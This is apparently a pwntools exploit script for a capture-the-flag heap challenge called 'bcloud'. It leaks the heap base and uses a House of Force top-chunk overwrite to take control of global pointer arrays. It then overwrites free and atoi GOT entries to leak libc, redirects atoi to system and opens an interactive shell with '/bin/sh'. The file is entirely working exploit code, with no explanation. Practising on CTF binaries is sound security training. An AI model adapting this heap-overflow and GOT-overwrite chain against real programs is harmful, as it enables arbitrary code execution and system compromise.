from pwn import *
context.binary = './bcloud'
context.log_level = 'debug'
elf = context.binary
libc = context.binary.libc
p = process('./bcloud')
def add(size, content):
	p.recvuntil('option--->>\n')
	p.sendline('1')
	p.recvuntil('Input the length of the note content:\n')
	p.sendline(str(size))
	p.recvuntil('Input the content:')
	p.sendline(content)
	print "add a chunk sucess!"
	
def edit(idx, content):
	p.recvuntil('option--->>\n')
	p.sendline('3')
	p.recvuntil('Input the id:\n')
	p.sendline(str(idx))
	p.recvuntil('Input the new content:\n')
	p.sendline(content)
	
	print "change chunk %d sucess" % idx

def delete(idx):
	p.recvuntil('option--->>\n')
	p.sendline('4')
	p.recvuntil('Input the id:\n')
	p.sendline(str(idx))
	
	print "delete chunk %d sucess!" % idx

#leak heapbase
p.recvuntil('Input your name:\n')
p.send('a'*0x40)

p.recvuntil('a'*0x40)
heapbase = u32(p.recvuntil('!').strip('!').ljust(4,'\x00'))-8
print "heapbase ==> "+hex(heapbase)

p.recvuntil('Org:\n')
p.send('o'*0x40)

p.recvuntil('Host:\n')
p.sendline('\xff'*0x4)			#now topchunk size = 0xffffffff

p.readuntil("Enjoy:")

size_ptr = 0x0804B0A0	
content_ptr = 0x0804B120
target_addr = size_ptr - 8
topchunk_addr = heapbase + (0x40+8)*3
size = target_addr - 7 - topchunk_addr

print "malloc_size ==> " + hex(size)
add(size-4, 'a')

#now topchunk points to size_ptr

free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']

#size_ptr[0,1,2] = 16
#content_ptr[0,1,2] = free_got, atoi_got, atoi_got

payload = (p32(16)*3).ljust(content_ptr-size_ptr, 'a') + p32(free_got)+p32(atoi_got)+p32(atoi_got)
add(0x100, payload)
edit(0, p32(puts_plt))

delete(1)
atoi_addr = u32(p.recv(4))
libcbase = atoi_addr - libc.symbols['atoi']
system_addr = libcbase+libc.symbols['system']
print "system_addr ==> " + hex(system_addr)

edit(2,p32(system_addr))
p.recvuntil('option--->>\n')
p.sendline("/bin/sh\x00")

p.interactive()
p.close()






